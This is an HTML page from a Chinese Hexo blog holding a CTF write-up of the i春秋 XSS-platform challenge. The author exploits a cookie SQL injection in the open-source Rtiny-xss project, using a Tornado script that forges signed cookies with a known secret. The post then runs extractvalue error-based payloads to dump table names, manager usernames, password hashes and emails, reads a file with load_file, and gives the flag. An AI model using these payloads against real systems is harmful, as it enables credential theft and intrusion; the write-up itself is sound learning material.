@@ -1,0 +1,237 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://yoursite.com/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+<meta http-equiv="X-DNS-Prefetch-Control" content="on">
+<link rel="dns-prefetch" href="http://yoursite.com">
+<link rel="dns-prefetch" href="//www.google-analytics.com">
+<link rel="prefetch" href="http://yoursite.com">
+<link rel="prefetch" href="//www.google-analytics.com">
+
+
+<link rel="prerender" href="http://yoursite.com">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://yoursite.com">
+<meta name="author" content="John Doe">
+<link rel="stylesheet" href="/css/JSimple.css">
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>i春秋 xss平台 - Hexo</title>
+
+<meta name="keywords" content>
+
+<meta name="description " content>
+
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({
+            tex2jax: {
+                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+                processEscapes: true
+            }
+        });
+    </script>
+
+
+    
+
+    
+
+</head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="说">说</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <a href="/tags" title="Tags"><i class="fa fa-tags"></i><span>Tags</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">说IT</h1>
+        <h3 class="cover-siteTitle">用代码摇滚这个世界</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+    &nbsp;&nbsp;<div class="btn btn-telegram">
+        <a href="http://t.me/kunyintang" target="_blank" title="telegram" ref="friend">
+            <i class="fa fa-telegram"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-instagram">
+        <a href="https://www.instagram.com/mtangsir/" target="_blank" title="instagram" ref="friend">
+            <i class="fa fa-instagram"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-twitter">
+        <a href="https://twitter.com/tangkunyin" target="_blank" title="twitter" ref="friend">
+            <i class="fa fa-twitter"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-github">
+        <a href="https://github.com/tangkunyin" target="_blank" title="github" ref="friend">
+            <i class="fa fa-github"></i>
+        </a>
+    </div>
+
+
+        </div>
+    </div>
+</div>
+
+            <div class="page-title">
+    <ul>
+        <li><a href="/">Recent Posts</a></li>
+        
+        
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <input type="text" readonly="readonly" id="local-search-input-tip" placeholder="click to search...">
+        <button type="button" disabled="disabled" class="search-form-submit"><i class="fa fa-search"></i></button>
+    </form>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://shuoit.net" target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar">
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://shuoit.net" target="_blank">纠结伦</a>
+                    <span title="Last edited at&nbsp;2019-03-30">2019-03-30</span>
+                </p>
+                <p>一个搬🧱的劳斯基😁️️</p>
+            </div>
+            <h2 class="post-title">i春秋 XSS平台</h2>
+            <div class="post-meta">
+                emm... 2164 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>最后一道题了，做完了要去吃个饭，跑个步了，脑袋蒙蒙的，昨晚没睡好。。。。。。。<br>不过我估计这道题应该要好久吧。。。。。。。。。熬夜熬得双眼皮都出来了。累啊！！！！<br>一如既往地打开，熟悉的界面，以为SQL注入，试了半天，我的天，什么回复都没有，没办法，毫无思路，看看大佬们吧。。。</p>
+<h2 id="竟然还存在构造非法参数来报错得到消息，厉害了。。。菜鸟瑟瑟发抖！！！"><a href="#竟然还存在构造非法参数来报错得到消息，厉害了。。。菜鸟瑟瑟发抖！！！" class="headerlink" title="竟然还存在构造非法参数来报错得到消息，厉害了。。。菜鸟瑟瑟发抖！！！"></a>竟然还存在构造非法参数来报错得到消息，厉害了。。。菜鸟瑟瑟发抖！！！</h2><p>用burpsuite抓包，构造错误参数，flag[],如下：<br><img src="/2019/03/30/i春秋-XSS平台/i春秋-XSS平台-b7f0f8a6.PNG" alt><br>在报错信息里发现了开源项目Rtiny：<a href="https://github.com/r0ker/Rtiny-xss/tree/master" target="_blank" rel="noopener">https://github.com/r0ker/Rtiny-xss/tree/master</a><br>在rinty\lock.py找到了可以SQL注入的地方：<br><img src="/2019/03/30/i春秋-XSS平台/i春秋-XSS平台-eb848c8d.PNG" alt><br>黄底的地方便是可以注入的地方，username没有任何的过滤，但是set_secure_cookie，这是个什么？找找资料后发现，它是tornado的一个方法，我找到的资料：<br><a href="https://blog.csdn.net/xc_zhou/article/details/80637714" target="_blank" rel="noopener">https://blog.csdn.net/xc_zhou/article/details/80637714</a><br>然后复制大佬的脚本如下：<br>import tornado.ioloop<br>import tornado.web</p>
+<p>settings = {<br>   “cookie_secret” : “M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=”,<br>}</p>
+<p>class MainHandler(tornado.web.RequestHandler):<br>    def get(self):<br>        self.write(“Hello”)<br>        self.set_secure_cookie(“username”,”‘ extractvalue(1,concat(0x5c,(select version()))) – “)##注入点<br>        self.write(self.get_secure_cookie(“username”))</p>
+<p>def make_app():<br>    return tornado.web.Application([<br>        (r”/index”, MainHandler),<br>        ], **settings)</p>
+<p>if <strong>name</strong> == “<strong>main</strong>“:<br>    app = make_app()<br>    app.listen(8080)<br>    tornado.ioloop.IOLoop.instance().start(）<br>然后用火狐浏览器访问本机ip地址+8080/index：<br><img src="/2019/03/30/i春秋-XSS平台/i春秋-XSS平台-436410fd.PNG" alt><br>然后f12，抓包：<br><img src="/2019/03/30/i春秋-XSS平台/i春秋-XSS平台-c02f0a76.PNG" alt><br>带上刚找到的cookie（username）访问lock(爆出版本)：<br><img src="/2019/03/30/i春秋-XSS平台/i春秋-XSS平台-6ca99ee8.PNG" alt><br>然后爆出表名：<br>‘ and extractvalue(1,concat(0x5c,(select group_concat(distinct table_name) from information_schema.tables where table_schema=database())))#<br>结果：<br><img src="/2019/03/30/i春秋-XSS平台/i春秋-XSS平台-652a7071.PNG" alt><br>然后列名:<br>‘ and extractvalue(1,concat(0x5c,(select group_concat(distinct column_name) from information_schema.columns where table_schema=database() and table_name=’manager’)))–<br><img src="/2019/03/30/i春秋-XSS平台/i春秋-XSS平台-c0058443.PNG" alt><br>用户名和密码：<br>‘ and extractvalue(1,concat(0x5c,mid((select group_concat(username,’|’,password,’|’,email) from manager),30,62))) –<br><img src="/2019/03/30/i春秋-XSS平台/i春秋-XSS平台-abd627a6.PNG" alt><br>突然发现用户名和密码大小不对啊，调整一下。。出了前半截。。。<br>‘ and extractvalue(1,concat(0x5c,mid((select group_concat(username,’|’,password,’|’,email) from manager),1,30))) –<br><img src="/2019/03/30/i春秋-XSS平台/i春秋-XSS平台-3c911529.PNG" alt><br>接着MD5解密，密码出来，输入，打开文档：<br><img src="/2019/03/30/i春秋-XSS平台/i春秋-XSS平台-d6c7c8be.PNG" alt><br>tornado框架直接访问txt是不行的<br>所以通过之前的cookie注入 结合load_file函数 读取/var/www/html/f13g_ls_here.txt 文件接着用load_file()打开文件，终于要结束了。。<br><img src="/2019/03/30/i春秋-XSS平台/i春秋-XSS平台-c2b25d07.PNG" alt><br>又是一半一半的，以下同上边那个用户名和密码<br><img src="/2019/03/30/i春秋-XSS平台/i春秋-XSS平台-34fcda2c.PNG" alt><br>最后结果：<br>flag{5c2c3e6c-0ca7-4053-92df-742c9e394749}<br>为什么i春秋提交错误，，，讨厌。。。。。<br>终于结束，不过还是不理解为什么要改lock。。。。。。。。。。。。。。<br>问了一个大佬，大佬给了解释,大佬人还是超级超级好的。。。。<br>大佬说因为注入的地方为在lock.py。应该是这个意思，python写的网址是通过这种方式区分不同的文件，/login指的是login.py,/lock指的是lock.py.<br>最后一个问题时cookie注入，复制过去的cookie里有加密的sql语句。。。。。我得再看看，还是寒假看的，都忘了，都忘了。。。。。。。。。。。<br>先这样，吃饭了，跑步就算了，沈阳竟然下雪了。。。。。。。。。。。。</p>
+
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
+            </a>
+        </div>
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/ctf-web/">ctf web</a>
+            
+        </div>
+        
+    </article>
+    
+    <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+
+    
+
+</div>
+<script src="/js/busuanzi.pure.mini.js"></script>
+
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner" style="text-align: center">
+        <p>
+            <a href="/about" title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="Help">Help</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="Links">Links</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/sitemap.xml" title="SiteMap">SiteMap</a>
+        </p>
+        <p>
+            Has been established&nbsp<a href="/timeline" id="siteBuildingTime"></a>&nbspDays，<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="licence">Based on Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a><br>
+            ©2017-<span id="cpYear"></span> Based on&nbsp<a href="http://hexo.io" target="_blank" rel="nofollow">Hexo</a>
+            ，Theme by&nbsp&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank" rel="bookmark">JSimple</a>
+            ，Author&nbsp<a href="https://shuoit.net" target="_blank" rel="friend">纠结伦</a>
+            ，Hosted by <a href="https://pages.github.com/" target="_blank" rel="nofollow">GitHub Pages</a>
+        </p>
+    </div>
+</footer>
+<script src="/js/SimpleCore.js"></script>
+
+</div>
+<!-- search pop -->
+<div class="popup search-popup local-search-popup">
+    <div class="local-search-header clearfix">
+        <span class="search-icon">
+            <i class="fa fa-search"></i>
+        </span>
+        <span class="popup-btn-close">
+            <i class="fa fa-times-circle"></i>
+        </span>
+        <div class="local-search-input-wrapper">
+            <input id="local-search-input" spellcheck="false" type="text" autocomplete="off" placeholder="Input query keywords here...">
+        </div>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        var jsi_config = {
+            buildingTime: '01/20/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+            localSearch: { dbPath: '' },
+            readMode: 'day'
+        };
+        
+        SimpleCore.init(jsi_config);
+        
+    });
+</script>
+</body>
+</html>
